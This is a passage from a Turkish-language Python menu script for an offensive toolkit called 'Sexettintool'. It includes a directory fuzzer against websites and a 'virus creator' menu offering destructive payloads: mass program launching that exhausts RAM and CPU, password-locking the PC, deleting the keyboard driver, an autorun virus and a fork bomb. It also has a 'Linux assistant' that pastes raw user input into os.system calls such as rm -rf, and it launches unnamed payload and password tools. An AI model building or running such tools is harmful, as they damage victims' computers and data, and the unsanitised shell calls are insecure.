	print("\nDirectory Fuzzer: bir web sitesindeki dizinlerin ve dosyaların var olup olmadığını test etmek için kullanılan basit bir saldırı aracıdır.")
	url = input("Url giriniz: ")
	print("Ext: Genellikle bir URL'nin sonuna eklenebilecek uzantı, örneğin .php, .html, veya /")
	ext = input("Ext giriniz: ")
	wlist = input("Wordlist giriniz: ")
	print("İşlemler arası bekleme süresini arttırmak daha kesin sonuç verir fakat işlem süresini uzatır")
	bekle_df = int(input("İşlemler arası bekleme süresi giriniz:"))
	with open(wlist, "r") as file:
		wlistlines = file.readlines()
	for line in wlistlines:
		enum = line.strip() 
		r = requests.get(f"{url}/{enum}{ext}")
		if r.status_code != 404:
			print(f"{url}/{enum}{ext} - {r.status_code}")
		time.sleep(bekle_df)
	
elif(sexettinsecim=="24"):
	os.system("python3 metfora.py")
	
elif(sexettinsecim=="25"):
	os.system("clear")
	print("\033[91m")
	print('''
Sexettintool virüs oluşturucu v2
               ...
             ;::::;
           ;::::; :;
         ;:::::'   :;
        ;:::::;     ;.
       ,:::::'       ;           
       ::::::;       ;          OOOOO
       ;:::::;       ;         OOOOOOOO
      ,;::::::;     ;'         / OOOOOOO
    ;:::::::::`. ,,,;.        /  / DOOOOOO
  .';:::::::::::::::::;,     /  /     DOOOO
 ,::::::;::::::;;;;::::;,   /  /        DOOO
;`::::::`'::::::;;;::::: ,#/  /          DOOO
:`:::::::`;::::::;;::: ;::#  /            DOOO
::`:::::::`;:::::::: ;::::# /              DOO
`:`:::::::`;:::::: ;::::::#/               DOO
 :::`:::::::`;; ;:::::::::##                OO
 ::::`:::::::`;::::::::;:::#                OO
 `:::::`::::::::::::;'`:;::#                O
  `:::::`::::::::;' /  / `:#
   ::::::`:::::;'  /  /   `#


Yaptığınız ve yapacağınız her şeyden siz sorumlusunuz.

4 tane virüs oluşturma seçeneği mevcuttur.

1-) Sınırsız cmd açar. py ve exe olarak çıktı alabilirsiniz

2-) Yüzlerce programı aynı anda açar, ram ve işlemciye zarar verir. Bilgisayara şifre koyar. Bilgisayarı bir süre sonra kapatır. Keyboard drv dosyasını siler ve önemli uygulamaları kapatır. Masaüstünü klasörlere boğar. Bat formatında çıktı alabilirsiniz

3-) Autorun virüsü oluştur (virüsünüzü autoruna bağlarsanız bilgisayar her açıldığında veya flash belleğe atarsanız flash her takıldığında virüs otomatik açılır) 

4-) Fork bomb oluştur

5-) Ana menüye dön

''')
	vsecenek = input("Hangisini seçiyorsunuz > ")
	if(vsecenek=="1"):
		os.system("python3 vrs/virusolustur.py")
	elif(vsecenek=="2"):
		os.system("python3 vrs/virusolustur2.py")
	elif(vsecenek=="3"):
		os.system("python3 vrs/virusolustur3.py")
	elif(vsecenek=="4"):
		os.system("python3 vrs/virusolustur4.py")
	elif(vsecenek=="5"):
		os.system("python3 sexettintoolsv"+surum+".py")
	
elif(sexettinsecim=="26"):
	import os
	print("\033[94m")
	print('''
 
         /~~~~~~\	
       /`    -s- ~~~~\		Linux Asistanına Hoş Geldiniz!
      /`::::      ~~~~		
     /`:::::     :		1-) Dosya Kopyala
    /` :::::...::::
   /`   `:::::::::::       	2-) Dizin Oluştur
  /`      `:::::::::
 /`        :::::::::		3-) Dosya Sil
 :        ::::::::::		
 :       :::::::::::		4-) Dosya Taşı
 :       :::::::::::		
 :       :::::::::::		5-) Dosya Oluştur
 :   .    ::::::::::					
 :   :.   ::::::::'		6-) Yazı Dosyası Oku
 :   ::  .:::::::'		
 :   ::..:::::::'		7-) Zip İşlemleri
 :    :::::::::'		
  :    :::::::::  		8-) Paket Yükle
  :    ::::::::: 		
   :..::......::		9-) Sistem Bilgisi

	''')
	asistansecenek = input("Seçiminiz Nedir? ")

	if(asistansecenek=="1"):
		dosya = input("Dosya yolu belirtiniz > ")
		hedef = input("Hedef yolu belirtiniz >")
		os.system("cp "+dosya+" "+hedef)

	elif(asistansecenek=="2"):
		dosya = input("Dizin adı girin > ")
		os.system("mkdir "+dosya)
	elif(asistansecenek=="3"):
		dosya = input("Dosya yolu belirtiniz > ")
		os.system("rm -rf "+dosya)
	elif(asistansecenek=="4"):
		dosya = input("Dosya yolu belirtiniz > ")
		hedef = input("Hedef yolu belirtiniz >")
		os.system("mv "+dosya+" "+hedef)
	elif(asistansecenek=="5"):
		dosya = input("Uzantısı ile beraber dosya adı girin > ")
		os.system("touch "+dosya)
	elif(asistansecenek=="6"):
		dosya = input("Dosya yolu belirtiniz > ")
		os.system("cat "+dosya)
	elif(asistansecenek=="7"):
		os.system("apt install zip unzip")
		print(''' 

1-) Dosya Sıkıştır

2-) Sıkıştırılmış Dosyayı Çıkar

	''')
		zip = input("Seçiminizi Yapınız > ")
		if(zip=="1"):
			dosya = input("Oluşacak zip adı giriniz > ")
			hedef = input("Ziplenecek dosyayı belirtiniz (uzantı ile) >")
			os.system("zip -r "+dosya+".zip "+hedef)

		elif(zip=="2"):
			dosya = input("Çıkartılacak Dosya Yolu > ")
			os.system("unzip "+dosya)		


	elif(asistansecenek=="8"):
		print("Hata alırsanız kök kullanıcı olun eğer zaten kök kullanıcı iseniz 'h' seçeneğini seçin")
		root = input("Kök kullanıcıya geçiş yapmak ister misiniz? (e/h) ")
		if(root=="e"):
			os.system("sudo su")
		elif(root=="E"):
			os.system("sudo su")

		elif(root=="h"):
			paket = input("Paket adı giriniz > ")
			os.system("apt install "+paket)
			os.system("pip install "+paket)
			os.system("pkg install "+paket)
			os.system("apt-get install "+paket)
		elif(root=="H"):
			paket = input("Paket adı giriniz > ")
			os.system("apt install "+paket)
			os.system("pip install "+paket)
			os.system("pkg install "+paket)
			os.system("apt-get install "+paket)
	elif(asistansecenek=="9"):
		print("-----Sistem bilgisini görmek için root olmanız gerek-----")
		os.system("sudo apt install neofetch")
		os.system("neofetch")

elif(sexettinsecim=="27"):
	import socket as s
	host = input("Site linki giriniz: ")
	try:
		ip = s.gethostbyname(host)
		print("\033[92m \n Girdiğiniz sitenin ip adresi : "+ip)
	except:
		print("\033[91m \n Hatalı site girdiniz veya da site bulunamadı. Urlyi girerken http/https veya da www yazmayın. Örnek kullanım: ipchat.rf.gd")

elif(sexettinsecim=="28"):
	os.system("python3 indexolusturucu/sxindexolusturucu.py")


elif(sexettinsecim=="29"):
	os.system("python3 xsnot.py")

elif(sexettinsecim=="30"):
	os.system("python3 fotodit.py")

elif(sexettinsecim=="31"):
	os.system("python3 dfinduser.py")

elif(sexettinsecim=="32"):
	os.system("python3 kits/stn-exif.py")

elif(sexettinsecim=="33"):
	os.system("python3 kits/fuzzing.py")

elif(sexettinsecim=="34"):
	os.system("python3 kits/hash-bulucu-dosya.py")

elif(sexettinsecim=="35"):
	os.system("python3 kits/dosya-izleme-monitoru.py")

elif(sexettinsecim=="36"):
	os.system("python3 password-kits/stncrypt-pre-1.py")

elif(sexettinsecim=="37"):
	os.system("python3 password-kits/stncrypt-pre-2.py")

elif(sexettinsecim=="38"):
	os.system("python3 password-kits/sifre-analiz-ai.py")

elif(sexettinsecim=="39"):
	os.system("python3 pico-payloads/main.py")

elif(sexettinsecim=="40"):
	os.system("python3 sexettin-twin/main.py")

elif(sexettinsecim=="41"):
	os.system("python3 blue-cough/main.py")

elif(sexettinsecim=="42"):
	os.system("python3 crawler-x11/main.py")

elif(sexettinsecim=="43"):
	os.system("python3 imitator-x11/main.py")

else:
	print("\033[91mSeçenek mevcut değil.")
	os.system("python3 sexettintoolsv"+surum+".py")


